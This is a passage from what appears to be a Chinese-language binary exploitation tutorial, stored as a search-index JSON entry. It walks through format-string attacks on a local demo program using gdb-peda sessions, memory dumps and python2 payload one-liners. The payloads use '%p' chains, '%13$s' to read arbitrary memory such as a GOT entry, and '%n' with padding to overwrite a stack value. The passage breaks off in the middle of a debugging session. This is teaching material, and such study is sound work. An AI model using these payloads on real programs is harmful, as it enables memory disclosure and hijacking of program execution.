(\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\") EIP: 0x56555642 (<main+133>: call 0x56555430 <printf@plt>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x56555638 <main+123>: push DWORD PTR [ebp-0xc] 0x5655563b <main+126>: lea eax,[ebp-0x94] 0x56555641 <main+132>: push eax => 0x56555642 <main+133>: call 0x56555430 <printf@plt> 0x56555647 <main+138>: add esp,0x20 0x5655564a <main+141>: sub esp,0xc 0x5655564d <main+144>: push 0xa 0x5655564f <main+146>: call 0x56555450 <putchar@plt> Guessed arguments: arg[0]: 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0xffffd57a (\"ABCD\") [------------------------------------stack-------------------------------------] 0000| 0xffffd550 --> 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\") 0004| 0xffffd554 --> 0x1 0008| 0xffffd558 --> 0x88888888 0012| 0xffffd55c --> 0xffffffff 0016| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0020| 0xffffd564 --> 0xffffd584 (\"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\") 0024| 0xffffd568 (\" RUV\\327UUVT\\332\\377\\367\\001\") 0028| 0xffffd56c --> 0x565555d7 (<main+26>: add ebx,0x1a29) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x56555642 in main () \u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u5730\u5740\u5728 0xffffd584 \uff0c\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u4e2d\u53ef\u4ee5\u770b\u5230\u5b83\u4eec\u5728\u6808\u4e2d\u662f\u600e\u6837\u6392\u5e03\u7684\uff1a gdb-peda$ x/20w $esp 0xffffd550: 0xffffd584 0x00000001 0x88888888 0xffffffff 0xffffd560: 0xffffd57a 0xffffd584 0x56555220 0x565555d7 0xffffd570: 0xf7ffda54 0x00000001 0x424135d0 0x00004443 0xffffd580: 0x00000000 0x41414141 0x2e70252e 0x252e7025 0xffffd590: 0x70252e70 0x2e70252e 0x252e7025 0x70252e70 gdb-peda$ x/20wb 0xffffd584 0xffffd584: 0x41 0x41 0x41 0x41 0x2e 0x25 0x70 0x2e 0xffffd58c: 0x25 0x70 0x2e 0x25 0x70 0x2e 0x25 0x70 0xffffd594: 0x2e 0x25 0x70 0x2e gdb-peda$ python print('\\x2e\\x25\\x70') .%p \u4e0b\u9762\u662f\u7a0b\u5e8f\u8fd0\u884c\u7684\u7ed3\u679c\uff1a gdb-peda$ c Continuing. AAAA.0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584.0x56555220.0x565555d7.0xf7ffda54.0x1.0x424135d0.0x4443.(nil).0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e 0x41414141 \u662f\u8f93\u51fa\u7684\u7b2c 13 \u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u6211\u4eec\u4f7f\u7528 %13$s \u5373\u53ef\u8bfb\u51fa 0x41414141 \u5904\u7684\u5185\u5bb9\uff0c\u5f53\u7136\uff0c\u8fd9\u91cc\u53ef\u80fd\u662f\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u5730\u5740\u3002\u4e0b\u9762\u6211\u4eec\u628a 0x41414141 \u6362\u6210\u6211\u4eec\u9700\u8981\u7684\u5408\u6cd5\u7684\u5730\u5740\uff0c\u6bd4\u5982\u5b57\u7b26\u4e32 ABCD \u7684\u5730\u5740 0xffffd57a \uff1a $ python2 -c 'print(\"\\x7a\\xd5\\xff\\xff\"+\".%13$s\")' > text $ gdb -q a.out Reading symbols from a.out...(no debugging symbols found)...done. gdb-peda$ b printf Breakpoint 1 at 0x8048350 gdb-peda$ r < text [----------------------------------registers-----------------------------------] EAX: 0xffffd584 --> 0xffffd57a (\"ABCD\") EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd54c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd54c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd550 --> 0xffffd584 --> 0xffffd57a (\"ABCD\") 0008| 0xffffd554 --> 0x1 0012| 0xffffd558 --> 0x88888888 0016| 0xffffd55c --> 0xffffffff 0020| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0024| 0xffffd564 --> 0xffffd584 --> 0xffffd57a (\"ABCD\") 0028| 0xffffd568 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20w $esp 0xffffd54c: 0x08048520 0xffffd584 0x00000001 0x88888888 0xffffd55c: 0xffffffff 0xffffd57a 0xffffd584 0x080481fc 0xffffd56c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd57c: 0x00004443 0x00000000 0xffffd57a 0x3331252e 0xffffd58c: 0x00007324 0xffffd5ca 0x00000001 0x000000c2 gdb-peda$ x/s 0xffffd57a 0xffffd57a: \"ABCD\" gdb-peda$ c Continuing. z\ufffd\ufffd\ufffd.ABCD \u5f53\u7136\u8fd9\u4e5f\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u6211\u4eec\u771f\u6b63\u7ecf\u5e38\u7528\u5230\u7684\u5730\u65b9\u662f\uff0c\u628a\u7a0b\u5e8f\u4e2d\u67d0\u51fd\u6570\u7684 GOT \u5730\u5740\u4f20\u8fdb\u53bb\uff0c\u7136\u540e\u83b7\u5f97\u8be5\u5730\u5740\u6240\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u865a\u62df\u5730\u5740\u3002\u7136\u540e\u6839\u636e\u51fd\u6570\u5728 libc \u4e2d\u7684\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u8ba1\u7b97\u51fa\u6211\u4eec\u9700\u8981\u7684\u51fd\u6570\u5730\u5740\uff08\u5982 system() \uff09\u3002\u5982\u4e0b\u9762\u5c55\u793a\u7684\u8fd9\u6837\uff1a \u5148\u770b\u4e00\u4e0b\u91cd\u5b9a\u5411\u8868\uff1a $ readelf -r a.out Relocation section '.rel.dyn' at offset 0x2e8 contains 1 entries: Offset Info Type Sym.Value Sym. Name 08049ffc 00000206 R_386_GLOB_DAT 00000000 __gmon_start__ Relocation section '.rel.plt' at offset 0x2f0 contains 4 entries: Offset Info Type Sym.Value Sym. Name 0804a00c 00000107 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 0804a010 00000307 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a014 00000407 R_386_JUMP_SLOT 00000000 putchar@GLIBC_2.0 0804a018 00000507 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 .rel.plt \u4e2d\u6709\u56db\u4e2a\u51fd\u6570\u53ef\u4f9b\u6211\u4eec\u9009\u62e9\uff0c\u6309\u7406\u8bf4\u9009\u62e9\u4efb\u610f\u4e00\u4e2a\u90fd\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u662f\u5728\u5b9e\u8df5\u4e2d\u6211\u4eec\u4f1a\u53d1\u73b0\u4e00\u4e9b\u95ee\u9898\u3002\u4e0b\u9762\u7684\u7ed3\u679c\u5206\u522b\u662f printf \u3001 __libc_start_main \u3001 putchar \u548c __isoc99_scanf \uff1a $ python2 -c 'print(\"\\x0c\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out .0x1.0x88888888.0xffffffff.0xffe22cfa.0xffe22d04.0x80481fc.0x80484b0.0xf77afa54.0x1.0x424155d0.0x4443.(nil).0x2e0804a0.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025 $ python2 -c 'print(\"\\x10\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out .0x1.0x88888888.0xffffffff.0xffd439ba.0xffd439c4.0x80481fc.0x80484b0.0xf77b6a54.0x1.0x4241c5d0.0x4443.(nil).0x804a010.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e $ python2 -c 'print(\"\\x14\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out .0x1.0x88888888.0xffffffff.0xffcc17aa.0xffcc17b4.0x80481fc.0x80484b0.0xf7746a54.0x1.0x4241c5d0.0x4443.(nil).0x804a014.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e $ python2 -c 'print(\"\\x18\\xa0\\x04\\x08\"+\".%p\"*20)' | ./a.out \u2592.0x1.0x88888888.0xffffffff.0xffcb99aa.0xffcb99b4.0x80481fc.0x80484b0.0xf775ca54.0x1.0x424125d0.0x4443.(nil).0x804a018.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e \u7ec6\u5fc3\u4e00\u70b9\u4f60\u5c31\u4f1a\u53d1\u73b0\u7b2c\u4e00\u4e2a\uff08 printf \uff09\u7684\u7ed3\u679c\u6709\u95ee\u9898\u3002\u6211\u4eec\u8f93\u5165\u4e86 \\x0c\\xa0\\x04\\x08 \uff08 0x0804a00c \uff09\uff0c\u53ef\u662f 13 \u53f7\u4f4d\u7f6e\u8f93\u51fa\u7684\u7ed3\u679c\u5374\u662f 0x2e0804a0 \uff0c\u90a3\u4e48\uff0c \\x0c \u54ea\u53bb\u4e86\uff0c\u67e5\u4e86\u4e00\u4e0b ASCII \u8868\uff1a Oct Dec Hex Char \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 014 12 0C FF '\\f' (form feed) \u4e8e\u662f\u5c31\u88ab\u7701\u7565\u4e86\uff0c\u540c\u6837\u4f1a\u88ab\u7701\u7565\u7684\u8fd8\u6709\u5f88\u591a\uff0c\u5982 \\x07 \uff08'\\a'\uff09\u3001 \\x08 \uff08'\\b'\uff09\u3001 \\x20 \uff08SPACE\uff09\u7b49\u7684\u4e0d\u53ef\u89c1\u5b57\u7b26\u90fd\u4f1a\u88ab\u7701\u7565\u3002\u8fd9\u5c31\u4f1a\u8ba9\u6211\u4eec\u540e\u7eed\u7684\u64cd\u4f5c\u51fa\u73b0\u95ee\u9898\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9009\u7528\u6700\u540e\u4e00\u4e2a\uff08 __isoc99_scanf \uff09\u3002 $ python2 -c 'print(\"\\x18\\xa0\\x04\\x08\"+\"%13$s\")' > text $ gdb -q a.out Reading symbols from a.out...(no debugging symbols found)...done. gdb-peda$ b printf Breakpoint 1 at 0x8048350 gdb-peda$ r < text [----------------------------------registers-----------------------------------] EAX: 0xffffd584 --> 0x804a018 --> 0xf7e3a790 (<__isoc99_scanf>: push ebp) EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd618 --> 0x0 ESP: 0xffffd54c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd54c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd550 --> 0xffffd584 --> 0x804a018 --> 0xf7e3a790 (<__isoc99_scanf>: push ebp) 0008| 0xffffd554 --> 0x1 0012| 0xffffd558 --> 0x88888888 0016| 0xffffd55c --> 0xffffffff 0020| 0xffffd560 --> 0xffffd57a (\"ABCD\") 0024| 0xffffd564 --> 0xffffd584 --> 0x804a018 --> 0xf7e3a790 (<__isoc99_scanf>: push ebp) 0028| 0xffffd568 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20w $esp 0xffffd54c: 0x08048520 0xffffd584 0x00000001 0x88888888 0xffffd55c: 0xffffffff 0xffffd57a 0xffffd584 0x080481fc 0xffffd56c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd57c: 0x00004443 0x00000000 0x0804a018 0x24333125 0xffffd58c: 0x00f00073 0xffffd5ca 0x00000001 0x000000c2 gdb-peda$ x/w 0x804a018 0x804a018: 0xf7e3a790 gdb-peda$ c Continuing. \u2592\ufffd\ufffd\ufffd\ufffd \u867d\u7136\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 x/w \u6307\u4ee4\u5f97\u5230 __isoc99_scanf \u51fd\u6570\u7684\u865a\u62df\u5730\u5740 0xf7e3a790 \u3002\u4f46\u662f\u7531\u4e8e 0x804a018 \u5904\u7684\u5185\u5bb9\u662f\u4ecd\u7136\u4e00\u4e2a\u6307\u9488\uff0c\u4f7f\u7528 %13$s \u6253\u5370\u5e76\u4e0d\u6210\u529f\u3002\u5728\u4e0b\u9762\u7684\u5185\u5bb9\u4e2d\u5c06\u4f1a\u4ecb\u7ecd\u600e\u6837\u501f\u52a9 pwntools \u7684\u529b\u91cf\uff0c\u6765\u83b7\u5f97\u6b63\u786e\u683c\u5f0f\u7684\u865a\u62df\u5730\u5740\uff0c\u5e76\u80fd\u591f\u5bf9\u5b83\u6709\u8fdb\u4e00\u6b65\u7684\u5229\u7528\u3002 \u5f53\u7136\u5e76\u975e\u603b\u80fd\u901a\u8fc7\u4f7f\u7528 4 \u5b57\u8282\u7684\u8df3\u8f6c\uff08\u5982 AAAA \uff09\u6765\u6b65\u8fdb\u53c2\u6570\u6307\u9488\u53bb\u5f15\u7528\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u90e8\u5206\uff0c\u6709\u65f6\uff0c\u9700\u8981\u5728\u683c\u5f0f\u5b57\u7b26\u4e32\u4e4b\u524d\u52a0\u4e00\u4e2a\u3001\u4e24\u4e2a\u6216\u4e09\u4e2a\u5b57\u7b26\u7684\u524d\u7f00\u6765\u5b9e\u73b0\u4e00\u7cfb\u5217\u7684 \uff14 \u5b57\u8282\u8df3\u8f6c\u3002","title":"\u67e5\u770b\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58"},{"location":"Tutorial/Material/Binary%20Exploitation/#_11","text":"\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u8bfb\u53d6\u6808\u4e0a\u548c\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u4e86\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u66f4\u8fdb\u4e00\u6b65\uff0c\u901a\u8fc7\u4fee\u6539\u6808\u548c\u5185\u5b58\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 %n \u8f6c\u6362\u6307\u793a\u7b26\u5c06 %n \u5f53\u524d\u5df2\u7ecf\u6210\u529f\u5199\u5165\u6d41\u6216\u7f13\u51b2\u533a\u4e2d\u7684\u5b57\u7b26\u4e2a\u6570\u5b58\u50a8\u5230\u5730\u5740\u7531\u53c2\u6570\u6307\u5b9a\u7684\u6574\u6570\u4e2d\u3002 #include<stdio.h> void main() { int i; char str[] = \"hello\"; printf(\"%s %n\\n\", str, &i); printf(\"%d\\n\", i); } $ ./a.out hello 6 i \u88ab\u8d4b\u503c\u4e3a 6\uff0c\u56e0\u4e3a\u5728\u9047\u5230\u8f6c\u6362\u6307\u793a\u7b26\u4e4b\u524d\u4e00\u5171\u5199\u5165\u4e86 6 \u4e2a\u5b57\u7b26\uff08 hello \u52a0\u4e0a\u4e00\u4e2a\u7a7a\u683c\uff09\u3002\u5728\u6ca1\u6709\u957f\u5ea6\u4fee\u9970\u7b26\u65f6\uff0c\u9ed8\u8ba4\u5199\u5165\u4e00\u4e2a int \u7c7b\u578b\u7684\u503c\u3002 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u8981\u9700\u8981\u8986\u5199\u7684\u503c\u662f\u4e00\u4e2a shellcode \u7684\u5730\u5740\uff0c\u800c\u8fd9\u4e2a\u5730\u5740\u5f80\u5f80\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u6570\u5b57\u3002\u8fd9\u65f6\u6211\u4eec\u5c31\u9700\u8981\u901a\u8fc7\u4f7f\u7528\u5177\u4f53\u7684\u5bbd\u5ea6\u6216\u7cbe\u5ea6\u7684\u8f6c\u6362\u89c4\u8303\u6765\u63a7\u5236\u5199\u5165\u7684\u5b57\u7b26\u4e2a\u6570\uff0c\u5373\u5728\u683c\u5f0f\u5b57\u7b26\u4e32\u4e2d\u52a0\u4e0a\u4e00\u4e2a\u5341\u8fdb\u5236\u6574\u6570\u6765\u8868\u793a\u8f93\u51fa\u7684\u6700\u5c0f\u4f4d\u6570\uff0c\u5982\u679c\u5b9e\u9645\u4f4d\u6570\u5927\u4e8e\u5b9a\u4e49\u7684\u5bbd\u5ea6\uff0c\u5219\u6309\u5b9e\u9645\u4f4d\u6570\u8f93\u51fa\uff0c\u53cd\u4e4b\u5219\u4ee5\u7a7a\u683c\u6216 0 \u8865\u9f50\uff08 0 \u8865\u9f50\u65f6\u5728\u5bbd\u5ea6\u524d\u52a0\u70b9 . \u6216 0 \uff09\u3002\u5982\uff1a #include<stdio.h> void main() { int i; printf(\"%10u%n\\n\", 1, &i); printf(\"%d\\n\", i); printf(\"%.50u%n\\n\", 1, &i); printf(\"%d\\n\", i); printf(\"%0100u%n\\n\", 1, &i); printf(\"%d\\n\", i); } $ ./a.out 1 10 00000000000000000000000000000000000000000000000001 50 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 100 \u5c31\u662f\u8fd9\u6837\uff0c\u4e0b\u9762\u6211\u4eec\u628a\u5730\u5740 0x8048000 \u5199\u5165\u5185\u5b58\uff1a printf(\"%0134512640d%n\\n\", 1, &i); $ ./a.out ... 0x8048000 \u8fd8\u662f\u6211\u4eec\u4e00\u5f00\u59cb\u7684\u7a0b\u5e8f\uff0c\u6211\u4eec\u5c1d\u8bd5\u5c06 arg2 \u7684\u503c\u66f4\u6539\u4e3a\u4efb\u610f\u503c\uff08\u6bd4\u5982 0x00000020 \uff0c\u5341\u8fdb\u5236 32\uff09\uff0c\u5728 gdb \u4e2d\u53ef\u4ee5\u770b\u5230\u5f97\u5230 arg2 \u7684\u5730\u5740 0xffffd538 \uff0c\u90a3\u4e48\u6211\u4eec\u6784\u9020\u683c\u5f0f\u5b57\u7b26\u4e32 \\x38\\xd5\\xff\\xff%08x%08x%012d%13$n \uff0c\u5176\u4e2d \\x38\\xd5\\xff\\xff \u8868\u793a arg2 \u7684\u5730\u5740\uff0c\u5360 4 \u5b57\u8282\uff0c %08x%08x \u8868\u793a\u4e24\u4e2a 8 \u5b57\u7b26\u5bbd\u7684\u5341\u516d\u8fdb\u5236\u6570\uff0c\u5360 16 \u5b57\u8282\uff0c %012d \u5360 12 \u5b57\u8282\uff0c\u4e09\u4e2a\u90e8\u5206\u52a0\u8d77\u6765\u5c31\u5360\u4e86 4+16+12=32 \u5b57\u8282\uff0c\u5373\u628a arg2 \u8d4b\u503c\u4e3a 0x00000020 \u3002\u683c\u5f0f\u5b57\u7b26\u4e32\u6700\u540e\u4e00\u90e8\u5206 %13$n \u4e5f\u662f\u6700\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u548c\u4e0a\u9762\u7684\u5185\u5bb9\u4e00\u6837\uff0c\u8868\u793a\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u7b2c 13 \u4e2a\u53c2\u6570\uff0c\u5373\u5199\u5165 0xffffd538 \u7684\u5730\u65b9\uff08 0xffffd564 \uff09\uff0c printf() \u5c31\u662f\u901a\u8fc7\u8fd9\u4e2a\u5730\u5740\u627e\u5230\u88ab\u8986\u76d6\u7684\u5185\u5bb9\u7684\uff1a $ python2 -c 'print(\"\\x38\\xd5\\xff\\xff%08x%08x%012d%13$n\")' > text $ gdb -q a.out Reading symbols from a.out...(no debugging symbols found)...done. gdb-peda$ b printf Breakpoint 1 at 0x8048350 gdb-peda$ r < text [----------------------------------registers-----------------------------------] EAX: 0xffffd564 --> 0xffffd538 --> 0x88888888 EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x88888888 0008| 0xffffd534 --> 0x1 0012| 0xffffd538 --> 0x88888888 0016| 0xffffd53c --> 0xffffffff 0020| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0024| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x88888888 0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20x $esp 0xffffd52c: 0x08048520 0xffffd564 0x00000001 0x88888888 0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564 0x080481fc 0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd55c: 0x00004443 0x00000000 0xffffd538 0x78383025 0xffffd56c: 0x78383025 0x32313025 0x33312564 0x00006e24 gdb-peda$ finish Run till exit from #0 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 [----------------------------------registers-----------------------------------] EAX: 0x20 (' ') EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x0 EDX: 0xf7f98830 --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x20 (' ') EIP: 0x8048520 (<main+138>: add esp,0x20) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048514 <main+126>: lea eax,[ebp-0x94] 0x804851a <main+132>: push eax 0x804851b <main+133>: call 0x8048350 <printf@plt> => 0x8048520 <main+138>: add esp,0x20 0x8048523 <main+141>: sub esp,0xc 0x8048526 <main+144>: push 0xa 0x8048528 <main+146>: call 0x8048370 <putchar@plt> 0x804852d <main+151>: add esp,0x10 [------------------------------------stack-------------------------------------] 0000| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x20 (' ') 0004| 0xffffd534 --> 0x1 0008| 0xffffd538 --> 0x20 (' ') 0012| 0xffffd53c --> 0xffffffff 0016| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0020| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x20 (' ') 0024| 0xffffd548 --> 0x80481fc --> 0x38 ('8') 0028| 0xffffd54c --> 0x80484b0 (<main+26>: add ebx,0x1b50) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x08048520 in main () gdb-peda$ x/20x $esp 0xffffd530: 0xffffd564 0x00000001 0x00000020 0xffffffff 0xffffd540: 0xffffd55a 0xffffd564 0x080481fc 0x080484b0 0xffffd550: 0xf7ffda54 0x00000001 0x424135d0 0x00004443 0xffffd560: 0x00000000 0xffffd538 0x78383025 0x78383025 0xffffd570: 0x32313025 0x33312564 0x00006e24 0xf7e70240 \u5bf9\u6bd4 printf() \u51fd\u6570\u6267\u884c\u524d\u540e\u7684\u8f93\u51fa\uff0c printf \u9996\u5148\u89e3\u6790 %13$n \u627e\u5230\u83b7\u5f97\u5730\u5740 0xffffd564 \u7684\u503c 0xffffd538 \uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5730\u5740 0xffffd538 \uff0c\u5c06\u5b83\u7684\u503c 0x88888888 \u8986\u76d6\u4e3a 0x00000020 \uff0c\u5c31\u5f97\u5230 arg2=0x00000020 \u3002","title":"\u8986\u76d6\u6808\u5185\u5bb9"},{"location":"Tutorial/Material/Binary%20Exploitation/#_12","text":"\u4e5f\u8bb8\u5df2\u7ecf\u6709\u4eba\u53d1\u73b0\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u4f7f\u7528\u4e0a\u9762\u8986\u76d6\u5185\u5b58\u7684\u65b9\u6cd5\uff0c\u503c\u6700\u5c0f\u53ea\u80fd\u662f 4\uff0c\u56e0\u4e3a\u5355\u5355\u5730\u5740\u5c31\u5360\u53bb\u4e86 4 \u4e2a\u5b57\u8282\u3002\u90a3\u4e48\u6211\u4eec\u600e\u6837\u8986\u76d6\u6bd4 4 \u5c0f\u7684\u503c\u5462\u3002\u5229\u7528\u6574\u6570\u6ea2\u51fa\u662f\u4e00\u4e2a\u65b9\u6cd5\uff0c\u4f46\u662f\u5728\u5b9e\u8df5\u4e2d\u8fd9\u6837\u505a\u57fa\u672c\u90fd\u4e0d\u4f1a\u6210\u529f\u3002\u518d\u60f3\u4e00\u4e0b\uff0c\u524d\u9762\u7684\u8f93\u5165\u4e2d\uff0c\u5730\u5740\u90fd\u4f4d\u4e8e\u683c\u5f0f\u5b57\u7b26\u4e32\u4e4b\u524d\uff0c\u8fd9\u6837\u505a\u771f\u7684\u6709\u5fc5\u8981\u5417\uff0c\u80fd\u5426\u5c06\u5730\u5740\u653e\u5728\u4e2d\u95f4\u3002\u6211\u4eec\u6765\u8bd5\u4e00\u4e0b\uff0c\u4f7f\u7528\u683c\u5f0f\u5b57\u7b26\u4e32 \"AA%15$nA\"+\"\\x38\\xd5\\xff\\xff\" \uff0c\u5f00\u5934\u7684 AA \u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u5373\u5c06\u5730\u5740\u8d4b\u503c\u4e3a 2 \uff0c\u4e2d\u95f4\u662f %15$n \u5360 5 \u4e2a\u5b57\u8282\uff0c\u8fd9\u91cc\u4e0d\u662f %13$n \uff0c\u56e0\u4e3a\u5730\u5740\u88ab\u6211\u4eec\u653e\u5728\u4e86\u540e\u9762\uff0c\u5728\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u7b2c 15 \u4e2a\u53c2\u6570\uff0c\u540e\u9762\u8ddf\u4e0a\u4e00\u4e2a A \u5360\u7528\u4e00\u4e2a\u5b57\u8282\u3002\u4e8e\u662f\u524d\u534a\u90e8\u5206\u603b\u5171\u5360\u7528\u4e86 2+5+1=8 \u4e2a\u5b57\u8282\uff0c\u521a\u597d\u662f\u4e24\u4e2a\u53c2\u6570\u7684\u5bbd\u5ea6\uff0c\u8fd9\u91cc\u7684 8 \u5b57\u8282\u5bf9\u9f50\u5341\u5206\u91cd\u8981\u3002\u6700\u540e\u518d\u8f93\u5165\u6211\u4eec\u8981\u8986\u76d6\u7684\u5730\u5740 \\x38\\xd5\\xff\\xff \uff0c\u8be6\u7ec6\u8f93\u51fa\u5982\u4e0b\uff1a $ python2 -c 'print(\"AA%15$nA\"+\"\\x38\\xd5\\xff\\xff\")' > text $ gdb -q a.out Reading symbols from a.out...(no debugging symbols found)...done. gdb-peda$ b printf Breakpoint 1 at 0x8048350 